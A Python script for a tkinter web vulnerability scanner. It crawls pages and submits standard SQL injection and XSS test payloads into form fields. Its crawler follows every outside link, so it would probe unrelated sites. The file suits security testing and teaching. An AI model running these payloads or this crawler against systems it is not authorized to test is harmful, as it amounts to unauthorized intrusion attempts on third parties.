import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import tkinter as tk
from tkinter import scrolledtext, messagebox

# Payloads
SQL_PAYLOADS = ["'", "' OR '1'='1", "';--", "\" OR \"\"=\""]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><script>alert(1)</script>"]

visited_links = set()

# Extract all forms
def get_all_forms(url):
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

# Get form details
def get_form_details(form):
    details = {"action": form.attrs.get("action"), "method": form.attrs.get("method", "get").lower(), "inputs": []}
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        details["inputs"].append({"type": input_type, "name": name})
    return details

# Submit form with payload
def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] in ["text", "search"] and input["name"]:
            data[input["name"]] = payload
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)
    except:
        return None

# SQL Injection Test
def test_sql_injection(url, log):
    log.insert(tk.END, f"\n[+] Testing SQL Injection on {url}\n")
    forms = get_all_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in SQL_PAYLOADS:
            response = submit_form(details, url, payload)
            if response and ("sql" in response.text.lower() or "syntax" in response.text.lower()):
                log.insert(tk.END, f"[-] Possible SQL Injection Vulnerability!\n  URL: {url}\n  Payload: {payload}\n")
                break

# XSS Test
def test_xss(url, log):
    log.insert(tk.END, f"\n[+] Testing XSS on {url}\n")
    forms = get_all_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if response and payload in response.text:
                log.insert(tk.END, f"[-] Possible XSS Vulnerability!\n  URL: {url}\n  Payload: {payload}\n")
                break

# Recursive Scanner
def scan(url, log):
    if url in visited_links:
        return
    visited_links.add(url)
    try:
        response = requests.get(url)
    except:
        log.insert(tk.END, f"[!] Failed to connect to {url}\n")
        return

    test_sql_injection(url, log)
    test_xss(url, log)

    soup = BeautifulSoup(response.text, "html.parser")
    for link in soup.find_all("a"):
        href = link.get("href")
        if href and href.startswith("http"):
            scan(href, log)

# GUI Launcher
def start_scan():
    url = entry.get()
    if not url.startswith("http"):
        messagebox.showerror("Invalid URL", "Please enter a valid URL starting with http or https.")
        return
    text_area.delete(1.0, tk.END)
    visited_links.clear()
    text_area.insert(tk.END, f"[*] Scanning started for: {url}\n")
    root.update()
    scan(url, text_area)
    text_area.insert(tk.END, "\n[*] Scan completed.\n")

# GUI Setup
root = tk.Tk()
root.title("Web Vulnerability Scanner")
root.geometry("700x500")

tk.Label(root, text="Enter Target URL:").pack(pady=5)
entry = tk.Entry(root, width=80)
entry.pack(pady=5)

tk.Button(root, text="Scan", command=start_scan, bg="green", fg="white").pack(pady=10)

text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=25)
text_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

root.mainloop()
